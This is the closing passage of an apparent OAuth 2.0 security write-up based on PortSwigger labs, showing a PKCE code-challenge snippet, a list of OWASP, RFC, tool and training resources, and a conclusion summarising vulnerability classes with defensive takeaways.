code_verifier = generate_random_string(128)
code_challenge = base64_url_encode(sha256(code_verifier))

# Authorization request
/auth?...&code_challenge=CHALLENGE&code_challenge_method=S256

# Token exchange
POST /token
code=AUTH_CODE&code_verifier=VERIFIER&client_id=CLIENT
```

---

## Additional Resources

### OWASP OAuth Documentation
- OAuth 2.0 Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html
- OAuth Testing Guide: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses

### RFCs and Standards
- RFC 6749: OAuth 2.0 Framework
- RFC 6750: OAuth 2.0 Bearer Token Usage
- RFC 7636: PKCE for OAuth Public Clients
- RFC 8252: OAuth for Native Apps
- OAuth 2.1 (Draft): Consolidated best practices

### Tools and Testing
- Burp Suite Pro: https://portswigger.net/burp
- OAuth Tools: https://oauth.tools/
- JWT Decoder: https://jwt.io/
- OAuth Debugger: https://oauthdebugger.com/

### CVE Databases
- National Vulnerability Database: https://nvd.nist.gov/
- CVE Details OAuth: https://www.cvedetails.com/
- PortSwigger Research: https://portswigger.net/research

### Training Platforms
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- PentesterLab: https://pentesterlab.com/
- HackTheBox: https://www.hackthebox.com/
- TryHackMe: https://tryhackme.com/

---

## Conclusion

OAuth 2.0 security requires careful implementation of multiple security controls. The six PortSwigger labs demonstrate critical vulnerabilities that occur in real-world applications:

1. **Client-Side Validation Failures**: Never trust client-supplied data
2. **CSRF Vulnerabilities**: Always implement state parameter
3. **redirect_uri Weaknesses**: Use exact matching and prevent traversal
4. **Token Leakage**: Avoid implicit flow, use authorization code with PKCE
5. **SSRF Risks**: Validate and restrict external resource fetching

Mastering these attacks enables both effective security testing and secure OAuth implementation. Always test OAuth flows comprehensively, validate all security parameters, and apply defense-in-depth principles.

**Key Takeaways**:
- OAuth is complex - complexity creates vulnerabilities
- Server-side validation is mandatory
- Use authorization code flow with PKCE
- Implement all security parameters (state, nonce)
- Test redirect_uri validation thoroughly
- Protect against SSRF in dynamic registration
- Monitor for suspicious OAuth activity
- Stay updated on latest OAuth security research

For more OAuth security resources, visit the references section and continue practicing with PortSwigger labs and bug bounty programs.
